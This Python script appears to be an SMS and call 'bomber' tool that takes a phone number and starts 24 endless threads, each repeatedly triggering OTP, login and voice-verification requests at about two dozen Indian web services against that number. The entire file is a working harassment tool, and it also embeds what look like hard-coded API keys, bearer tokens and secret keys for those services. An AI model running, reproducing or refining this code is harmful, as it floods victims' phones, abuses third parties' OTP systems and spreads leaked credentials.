import subprocess
import os
#from randmac import RandMac
p_need = ["threading", "requests", "colorama"]
def x_need(packages):
    for package in packages:
        try:
            subprocess.check_call(["pip", "install", package])
            print(f"Successfully installed {package}")
        except subprocess.CalledProcessError:
            print(f"Failed to install {package}")
x_need(p_need)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
clear_screen()

from random import randint
from colorama import Fore
import uuid
import threading , requests
from random import randrange, choice
lowercase="abcdef"
uppercase="ABCDEF"
mydigits="0123456789"
deviceid = ''.join(choice(lowercase + mydigits) for _ in range(16))
#newmac=str(RandMac("00:00:00:00:00:00", True))

newmac=str("E3:RR:03:F3:07:G4")

mydigits="0123456789"
deviceid=str(deviceid)
random = ''.join(choice(lowercase + mydigits) for _ in range(4))

def randomno(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return randint(range_start, range_end)



userid=str(randomno(11))
gaid=str(uuid.uuid4())

class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


text = """
XXXXXXX       XXXXXXNNNNNNNN        NNNNNNNN    OOOOOOOOO    TTTTTTTTTTTTTTTTTTTTTTYYYYYYY       YYYYYYY
X:::::X       X:::::N:::::::N       N::::::N  OO:::::::::OO  T:::::::::::::::::::::Y:::::Y       Y:::::Y
X:::::X       X:::::N::::::::N      N::::::NOO:::::::::::::OOT:::::::::::::::::::::Y:::::Y       Y:::::Y
X::::::X     X::::::N:::::::::N     N::::::O:::::::OOO:::::::T:::::TT:::::::TT:::::Y::::::Y     Y::::::Y
XXX:::::X   X:::::XXN::::::::::N    N::::::O::::::O   O::::::TTTTTT  T:::::T  TTTTTYYY:::::Y   Y:::::YYY
   X:::::X X:::::X  N:::::::::::N   N::::::O:::::O     O:::::O       T:::::T          Y:::::Y Y:::::Y
    X:::::X:::::X   N:::::::N::::N  N::::::O:::::O     O:::::O       T:::::T           Y:::::Y:::::Y
     X:::::::::X    N::::::N N::::N N::::::O:::::O     O:::::O       T:::::T            Y:::::::::Y
     X:::::::::X    N::::::N  N::::N:::::::O:::::O     O:::::O       T:::::T             Y:::::::Y
    X:::::X:::::X   N::::::N   N:::::::::::O:::::O     O:::::O       T:::::T              Y:::::Y
   X:::::X X:::::X  N::::::N    N::::::::::O:::::O     O:::::O       T:::::T              Y:::::Y
XXX:::::X   X:::::XXN::::::N     N:::::::::O::::::O   O::::::O       T:::::T              Y:::::Y
X::::::X     X::::::N::::::N      N::::::::O:::::::OOO:::::::O     TT:::::::TT            Y:::::Y
X:::::X       X:::::N::::::N       N:::::::NOO:::::::::::::OO      T:::::::::T         YYYY:::::YYYY
X:::::X       X:::::N::::::N        N::::::N  OO:::::::::OO        T:::::::::T         Y:::::::::::Y
XXXXXXX       XXXXXXNNNNNNNN         NNNNNNN    OOOOOOOOO          TTTTTTTTTTT         YYYYYYYYYYYYY
                                                                      by Samir Cyber Security
"""

# Print the text in color
colored_text = (
    Color.PURPLE + text + Color.END  # You can change PURPLE to any other color
)

print(colored_text)

no = str(input('PLEASE ENTER NUMBER: '))




sessionid=str('e77a3fa3f90e81d48748eaa9d805710384c9'+random)
launchid=str('5f204d1fec6602289934ac95f87e251b23ae'+random)
def bomb(no,spam):
   while True:
    api1 = requests.post(url='https://healthxp.in/wp-admin/admin-ajax.php?from=frontend', headers= {'accept': '*/*','x-requested-with': 'XMLHttpRequest','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://healthxp.in','referer': 'https://healthxp.in/my-account/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='action=send_healthxp_otp&validate_user=0&mobile='+no)
    print('Bombing Done With Api 1')

def bomb1(no,spam):
   while True:
    api1 = requests.post(url='https://f8w9uv95qe.execute-api.ap-south-1.amazonaws.com/prod/otp/generate/+91'+no+'', headers= {'accept': 'application/json, text/plain, */*','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36','origin': 'https://www.delhivery.com','referer': 'https://www.delhivery.com/track/package/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='')
    print('Bombing Done With Api 2')

def bomb2(no,spam):
   while True:
    api2 = requests.post(url='https://pharmeasy.in/api/auth/requestOTP', headers= {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0','accept': '*/*','accept-language': 'en-US,en;q=0.5','referer': 'https://pharmeasy.in/','content-type': 'application/json'}, data='{"contactNumber":"'+no+'"}')
    print('Bombing Done With Api 3')

def bomb3(no,spam):
   while True:
    headers={'Host': 'espresso.dunzo.in','accept': 'application/json','source-page': 'onb_otp_page_load','phone_make': 'Xiaomi | 24 | 3.9.0.1 | 1052 | gps- 20.06.16 (040408-296104215) : 200616021 | phone_info- mido, Redmi Note 4, AL1512-mido-build-20191107001817, 7.0','sessionid': sessionid,'appsessionid': sessionid,'launchsessionid': launchid,'userid': 'launchid','client_name': 'ANDROID','client_version': '3.9.0.1','content-type': 'application/json','user-agent': 'okhttp/2.7.2','authorization': ''}
    api3 = requests.post(url='https://espresso.dunzo.in/api/v1/user/register/', headers=headers, data='{"advertisingId":"'+gaid+'","appsFlyerAttributionData":{"af_message":"organic install","af_status":"Organic","is_first_launch":"false"},"country_code":"91","deviceId":"'+deviceid+'","from":0,"password":"af93aec21af39dcaa524a155c53daf547f392075","phone":"'+no+'","phone_make":"Xiaomi | 24 | 2.0.0.3 | 579 | gps- 20.06.16 (040408-296104215) : 200616021 | phone_info- mido, Redmi Note 4, AL1512-mido-build-20191107001817, 7.0","phone_type":"A"}')
    api4 = requests.post(url='https://espresso.dunzo.in/api/v1/user/verifythroughcall/', headers=headers, data='{"advertisingId":"'+gaid+'","appsFlyerAttributionData":{"af_message":"organic install","af_status":"Organic","is_first_launch":"false"},"country_code":"91","deviceId":"'+deviceid+'","from":0,"password":"af93aec21af39dcaa524a155c53daf547f392075","phone":"'+no+'","phone_make":"Xiaomi | 24 | 2.0.0.3 | 579 | gps- 20.06.16 (040408-296104215) : 200616021 | phone_info- mido, Redmi Note 4, AL1512-mido-build-20191107001817, 7.0","phone_type":"A"}')
    print('Bombing Done With Api 4')

def bomb4(no,spam):
   while True:
    api5 = requests.post(url='https://mobile-api-v5.nearbuy.com/v5/otp/resend?osId='+deviceid+'&width=1080&height=1920&density=3.0&andOsVersion=7.0&userId='+userid+'',headers= {'Host': 'mobile-api-v5.nearbuy.com','appversion': 'and_169','networkstatus': 'WIFI','content-type': 'application/json; charset=UTF-8','user-agent': 'okhttp/3.12.6'},data ='{"deliveryMode":"CALL","phoneNumber":'+no+'}')
    print('Bombing Done With Api 5')

def bomb5(no,spam):
   while True:
    api6 = requests.post(url = 'https://api-sg.decathlon.net/login/api/v1/send_otp',headers = {'x-api-key': 'e4985be6-6cac-4b6e-a1af-b5129b8aa9f6','Content-Type': 'application/x-www-form-urlencoded','Host': 'api-sg.decathlon.net','Connection': 'Keep-Alive','User-Agent': 'okhttp/4.3.1'},data='mobile='+no+'&country_code=%2B91')
    print('Bombing Done With Api 6')


def bomb6(no,spam):
   while True:
    api7 = requests.post(url='https://api.life99.in/api-mdm/auth/verify-on-board-user', headers= {'accept': 'application/json, text/plain, */*','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','content-type': 'application/json;charset=UTF-8','origin': 'https://life99.in','referer': 'https://life99.in/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='{"email":"'+no+'@mail.com","mobile":"'+no+'","isReferral":false}')
    print('Bombing Done With Api 7')

def bomb7(no,spam):
   while True:
    api8 = requests.post(url='https://zeus.housing.com/api/gql/network-only?compressed=true&isBot=false&source=web', headers= {'phoenix-api-name': 'LOGIN_CHECK_DETAIL','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','app-name': 'desktop_web_buyer','content-type': 'application/json; charset=UTF-8','accept': '*/*','origin': 'https://housing.com','referer': 'https://housing.com/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='{"query":"____juCh_jpM__jmG_jtx__jmGifjoAhjtx___jtxjpM___jpMifjrLjq4jtVjv4gg","variables":{"phone":"'+no+'"}}')
    print('Bombing Done With Api 8')

def bomb8(no,spam):
   while True:
    api9 = requests.post(url='https://api.halfcute.com/accounts/sendOtp', headers= {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','content-type': 'application/json','accept': '*/*','origin': 'https://halfcute.com','referer': 'https://halfcute.com/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='{"mobile":"'+no+'","country_code":"91","website_id":4}')
    print('Bombing Done With Api 9')

def bomb9(no,spam):
   while True:
    api10 = requests.post(url='https://api.adda52.com/api/v1/user/register/send-otp', headers= {'accept': '*/*','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.adda52.com','referer': 'https://www.adda52.com/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='mobile='+no+'&source=web')
    print('Bombing Done With Api 10')

def bomb10(no,spam):
   while True:
    api11 = requests.post(url='https://porter.in/customers/request_otp.json', headers= {'brand': 'porter','source': 'android','version-name': '5.12.2','custom-app-version-code': '119','client-request-uuid': 'ce106f6a-2776-4512-a239-ac5c83fe73a2','installation-id': '6ce8343f-2f02-4574-8a9a-64b23f7ae965','app-session-id': '37a4f51d-1444-4cd9-9340-fa85a6635d33','Accept-Charset': 'UTF-8','Accept': '*/*','User-Agent': 'Ktor client','Content-Type': 'application/json','Host': 'porter.in','Connection': 'Keep-Alive'}, data='{"mobile":"'+no+'","email":"'+no+'@mm.com","referral_code":null,"geo_region_id":null}')
    print('Bombing Done With Api 11')

def bomb11(no,spam):
   while True:
    api12 = requests.post(url='https://gomechanic.app/api/send_otp/', headers= {'Host': 'gomechanic.app','Connection': 'keep-alive','Authorization':'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJiNGJjM2NhZjVkMWVhOTlkYzk2YjQzM2NjYzQzMDI0ZTAyM2I0MGM2YjQ5ZjExN2JjMDk5OGY2MWU3ZDI1ZjM2MTU1YWU5ZDIxNjE2ZTc5NSIsInNjb3BlcyI6W10sInN1YiI6IjUwMzE0Nzk0NzEwMTQiLCJhdWQiOiIzIiwiaWF0IjoxNTk0OTk2MDEzLjAsIm5iZiI6MTU5NDk5NjAxMy4wLCJleHAiOjE1OTc1ODgwMTMuMH0.YshSND8jo4qnSRPC0FuwXrJsqMNl8qlW5nrF5uhdm2b_fm1QQSIWQdPaK4IJTOjN7G2bL9ON9Io2ps1sgpV0fuDcrq8nfpGrDhPL4kxsDKGchZKmHztwUt9XRzRnwd6epWNjmqB2ObkWs72nHhTZXOU_JhBmV1lF-LlZfaoTXzqXtorNvB5srDLunQ9mXRDZtaeCYc5PCSh7SxqjewyyLGopr5xTaEm3Ol4dffrViQe2IjneyWbynL4lu9fJIUDjW_izEqkdR07IYDuYytl6aCHiwpQwo1zSL9TwORVwxSUGmzmay270WIEB7rn5fMqaXa7cyVxRnUskIlKMEtczXAmPETGgkvH2dLRx1sXwlNtaoh4PhQ67sAkt2CPDnLn7xLb8xwy9-2TS1K8KxoYc5aYHKTBL8aMrHBQi0N6-v7GRt1lZEgr-Bv2Xoj4oKW8IrX937YIUTQCy2EkxQIEAeIb36dLX5gYYmQ2e0qXiKbk1Abljw7rW4rULCAg-J3ocywf1okUZvrd_qgra90ZN-AGij3ZyYvIPs9q_F8xJ0RcYZIAWbvUS-Hl5cwZmRkKC78kK29v6z-9askTi_A3wtyNujdfzsRBwPeVKmeRKoMfMQ-WBD4G80Df0cZLFEfN-cte3-Od5f2BlIcZOxhqmsSqyk9hW5Gh8a4-czQUOV3g','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','Content-Type': 'application/json','Accept': '*/*','Origin': 'https://gomechanic.in','Referer': 'https://gomechanic.in/chandigarh','Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='{"number":"'+no+'","source":"website"}')
    print('Bombing Done With Api 12')

def bomb12(no,spam):
   while True:
    api13 = requests.post(url='https://www.winzogames.com/', headers= {'cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://www.winzogames.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','referer': 'https://www.winzogames.com/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='phoneEN='+no+'&SendLinkEN=Get+App+Link')
    print('Bombing Done With Api 13')

def bomb13(no,spam):
   while True:
    api14 = requests.get(url = "https://www.healthkart.com/iron-man/user/validate/1/"+no+"/signup?plt=1&st=1",headers = {'accept': 'application/json, text/plain, */*','device': ''+deviceid+'','pincode': 'false','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','referer': 'https://www.healthkart.com/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
    print('Bombing Done With Api 14')

def bomb14(no,spam):
   while True:
    api15 = requests.get(url = 'https://b2bapi.zee5.com/device/sendotp.php?phoneno=91'+no+'',headers = {'Host': 'b2bapi.zee5.com','Connection': 'keep-alive','Accept': '*/*','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','Origin': 'https://www.zee5.com','Referer': 'https://www.zee5.com/verify-mobile-number','Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
    print('Bombing Done With Api 15')

def bomb15(no,spam):
   while True:
    api16 = requests.post(url='https://unacademy.com/api/v3/user/user_check/', headers= {'authorization': 'Bearer undefined','user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','content-type': 'application/json','accept': '*/*','origin': 'https://unacademy.com','referer': 'https://unacademy.com/','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='{"phone":"'+no+'","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}')
    print('Bombing Done With Api 16')

def bomb16(no,spam):
   while True:
    api17 = requests.post(url='https://www.urbanclap.com/api/v3/customers/simplegenerateotp', headers= {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','content-type': 'application/json;charset=UTF-8','accept': 'application/json, text/plain, */*','cache-control': 'no-cache','x-device-os': 'desktop_web','x-version-name': 'web_v4.125.1','x-client-key': 'f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6','x-device-id': 'ucu9008d-8b964d115f-a56a-aed1-a4bb-2d5f7eb9ee-1595323172243','x-version-code': '4.125.1','origin': 'https://www.urbancompany.com','accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}, data='{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"'+no+'"},"device_type":"customer"}')
    print('Bombing Done With Api 17')

def bomb17(no,spam):
   while True:
    api18 = requests.post(url='https://network.mfine.co/api/userservice/PhoneOTPs/createSignupOTP', headers= {'accept': 'application/json, text/plain, */*','x-secret-key': 'dEn3iQDYLnoZvXxbFw2dRIEXsg9v0B95ziKQgI8zEh6oQyaSX85siSFWsLM3C2vk','x-device-id': ''+deviceid+'','x-mclient-id': 'PA','x-user-tz': 'Asia/Calcutta','platform': 'android','build-version': '1.5.4-b307','content-type': 'application/json;charset=utf-8','user-agent': 'okhttp/3.12.1'}, data='{"phone":91'+no+',"realm":"pa"}')
    print('Bombing Done With Api 18')

def bomb18(no,spam):
   while True:
    api19 = requests.get(url = 'https://api.coolwinks.com/api/accounts/is_already_registered/?username='+no+'',headers = {'content-type': 'application/x-www-form-urlencoded;  charset="UTF-8','user-agent': 'Android','authorization':'','x-user-agent': 'Coolwinks/3.7.3 (com.coolwinks.cwapp; build:138; version:3.7.3) CWUA/android/138','version-code': '138','version-name': '3.7.3'})
    print('Bombing Done With Api 19')

def bomb19(no,spam):
   while True:
    api20= requests.post(url='https://api.lenskart.com/v2/customers/sendOtp', headers= {'x-session-token': '6713aa2d-3a8c-4188-9be8-5e1a234d7c8d','X-B3-TraceId': '1595531086340','uniqueId': '1737d104a03dd315','X-Build-Version': '200711001','api_key': 'valyoo123','Content-Type': 'application/json','appversion': '2.9.8 (200711001)','brand': 'xiaomi','x-app-version': '2.9.8 (200711001)','udid': ''+deviceid+'','model': 'Redmi Note 4','x-api-client': 'android','User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/V11.0.2.0.NCFMIXM)','Host': 'api.lenskart.com','Connection': 'keep-alive'}, data='{"telephone":"'+no+'"}')
    print('Bombing Done With Api 20')

def bomb20(no,spam):
   while True:
    api21 = requests.post(url='https://api.dominos.co.in/loginhandler/forgotpassword', headers= {'Cache-Control': 'no-cache','source': 'New Mobile App','userId': 'ap-south-1:b15edf0a-f919-4a34-a019-195ee5b89563','accesskeyid': 'ASIAWMIT2NXASTIT5HVC','storeId': '66566','authToken': 'ASIAWMIT2NXASTIT5HVC','api_key': '054d3769e495f0b2','deliveryType': 'D','Accept-Encoding': 'Identity','loggedInUser': 'false','secretkey': '2HxpP6yAs+MTarRFdcNYYq/TZ/565UlMjbDrU8Wj','client_type': 'mobile-android-8.6.1','user_agent': 'android','Content-Type': 'application/json; charset=UTF-8','Host': 'api.dominos.co.in','Connection': 'Keep-Alive','User-Agent': 'okhttp/3.12.8'}, data='{"mobile":"'+no+'"}')
    print('Bombing Done With Api 21')

def bomb21(no,spam):
   while True:
    api22 = requests.put(url='https://svc.medlife.com/ml-rest-services/v1/medlife/OTP?App-Platform=android&version=50047', headers= {'accept': '*/*','app-platform': 'android','version': '50047','guest-id': ''+deviceid+'','x-ab-test-values': 'Search-Elastic-Or-Algolia_false,Upload-Incentivising-AB_true,Show-Delivery-Details-Screen_false,green,revamped_delivery_charge_true,OLD_PROMO_CODE_FLOW,Order-Use-Tracking-v2_true,show_modal_true,Patient-AutoSuggest-PastRx-AB_true,search_recommendation_true,subscription_v2_true,Search-Use-Elastic-Over-Algolia_false,show_discount_true,show_referral_true,kattapa,MEDLIFE_FC,segment_coupon_false,sso_enabled,G6eipVv29Y','content-type': 'application/json','user-agent': 'okhttp/3.12.1'}, data='{"mobileNumber":"'+no+'"}')
    print('Bombing Done With Api 22')

def bomb22(no,spam):
   while True:
    api23 = requests.post(url='https://api.sqrrl.in/v1/auth', headers= {'api-key': '90a973d0200f45bea4652efb7ca684c6','deviceid': ''+deviceid+'','x-debug-id':'','content-type': 'application/json; charset=UTF-8','user-agent': 'okhttp/4.7.2'}, data='{"mobile":"'+no+'","use_hash":true}')
    print('Bombing Done With Api 23')

def bomb23(no,spam):
   while True:
    headers= {'device-id': 'cB7OscO60iM','authorization': 'Token','locale': 'en','content-type': 'application/json; charset=utf-8','user-agent': 'okhttp/3.12.10'}
    api24 = requests.post(url='https://api.shadowfax.in/app/v4/login/', headers= headers, data='{"version":212,"allottedphone":"'+no+'"}')
    api25 = requests.post(url='https://api.shadowfax.in/app/v3/login/ivr_otp/', headers= headers, data='{"version":212,"allottedphone":"'+no+'"}')
    print('Bombing Done With Api 24')




threading.Thread(target=bomb , args=(no,'spam')).start()
threading.Thread(target=bomb1 , args=(no,'spam')).start()
threading.Thread(target=bomb2 , args=(no,'spam')).start()
threading.Thread(target=bomb3 , args=(no,'spam')).start()
threading.Thread(target=bomb4 , args=(no,'spam')).start()
threading.Thread(target=bomb5 , args=(no,'spam')).start()
threading.Thread(target=bomb6 , args=(no,'spam')).start()
threading.Thread(target=bomb7 , args=(no,'spam')).start()
threading.Thread(target=bomb8 , args=(no,'spam')).start()
threading.Thread(target=bomb9 , args=(no,'spam')).start()
threading.Thread(target=bomb10 , args=(no,'spam')).start()
threading.Thread(target=bomb11 , args=(no,'spam')).start()
threading.Thread(target=bomb12 , args=(no,'spam')).start()
threading.Thread(target=bomb13 , args=(no,'spam')).start()
threading.Thread(target=bomb14 , args=(no,'spam')).start()
threading.Thread(target=bomb15 , args=(no,'spam')).start()
threading.Thread(target=bomb16 , args=(no,'spam')).start()
threading.Thread(target=bomb17 , args=(no,'spam')).start()
threading.Thread(target=bomb18 , args=(no,'spam')).start()
threading.Thread(target=bomb19 , args=(no,'spam')).start()
threading.Thread(target=bomb20 , args=(no,'spam')).start()
threading.Thread(target=bomb21 , args=(no,'spam')).start()
threading.Thread(target=bomb22 , args=(no,'spam')).start()
threading.Thread(target=bomb23 , args=(no,'spam')).start()
clear_screen()
